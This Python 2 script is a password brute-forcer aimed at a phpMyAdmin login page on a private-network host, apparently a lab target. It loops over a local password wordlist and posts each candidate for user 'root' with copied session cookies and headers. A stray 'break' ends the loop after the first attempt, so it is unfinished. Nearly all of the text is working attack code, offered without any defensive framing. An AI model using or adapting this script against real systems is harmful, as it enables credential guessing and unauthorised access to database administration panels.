#!/usr/bin/env python

import re
import requests
from bs4 import BeautifulSoup

url = "http://192.168.216.132:80/phpmyadmin/index.php"
headers = {
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "http://192.168.216.132/phpmyadmin/",
        "Cookie": "pmaCookieVer=4; pma_mcrypt_iv=VR1deFq2ROg%3D; pmaUser-1=%2FZhlMEKHEU0%3D; phpMyAdmin=eUceVD%2Cph54XI2ad1T3XMuIytE6; pma_lang=en-utf-8; pma_charset=iso-8859-1; pma_collation_connection=utf8_unicode_ci; pma_fontsize=82%25; PHPSESSID=05e1aed082d5fb37ae7fbeb21f752bae",
        "Content-Type": "application/x-www-form-urlencoded",
        }

data = {
        "pma_username": "root",
        "server": "1",
        "lang": "en-utf-8",
        "convcharset": "iso-8859-1",
        }
try:
    #fname = "/usr/share/sqlmap/txt/wordlist.txt"
    #fname = "/usr/share/ncrack/top50000.pwd"
    fname = "/root/desarrollos/dict_pass.lst"
    with open(fname) as f:
        for line in f:
            data["pma_password"] = line.strip()
            r = requests.post(url, headers=headers, data=data)
            print r
            #print r.headers
            print r.text
            break
            soup = BeautifulSoup(r.text, "lxml")
            g = soup.body.find_all(text="Access denied")
            print g
            #print r.text
except Exception, e:
    print e
